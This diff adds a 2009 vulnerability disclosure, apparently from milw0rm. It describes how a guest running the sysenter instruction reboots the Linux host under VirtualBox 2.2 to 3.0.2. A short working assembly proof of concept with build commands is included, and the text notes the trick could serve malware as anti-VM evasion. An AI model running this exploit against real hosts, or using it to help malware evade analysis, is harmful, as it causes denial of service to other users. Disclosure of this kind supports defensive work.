@@ -1,0 +1,34 @@
+Sun's VirtualBox host reboot PoC
+by Tadas Vilkeliskis <vilkeliskis.t@gmail.com>
+Disclosure made at 2009-08-01
+
+VULNERABILITY INFORMATION
+
+Remotely exploitable: no
+Locally exploitable: yes
+Affected versions: 2.2 - 3.0.2 r49928 for Linux
+
+VULNERABILITY DESCRIPTION
+
+VirtualBox VM is unable to handle fast call to privilege level 0 system
+procedures (sysenter). If sysenter instruction is executed on the guest
+OS the host machine will reboot. The technique was tested on the
+following guest OS: Windows XP, Windows 7 RC, Ubuntu 9.04. It is not
+clear whether it is possible to execute arbitrary code on the host,
+however this trick can be successfully used by malware as an anti-vm
+trick.
+
+POC
+
+; nasm -f elf vmhostreboot.asm
+; gcc vmhostreboot.o -o vmhostreboot
+
+BITS 32
+SECTION .text
+GLOBAL main
+
+main:
+    sysenter
+    ret
+
+# milw0rm.com [2009-08-01]
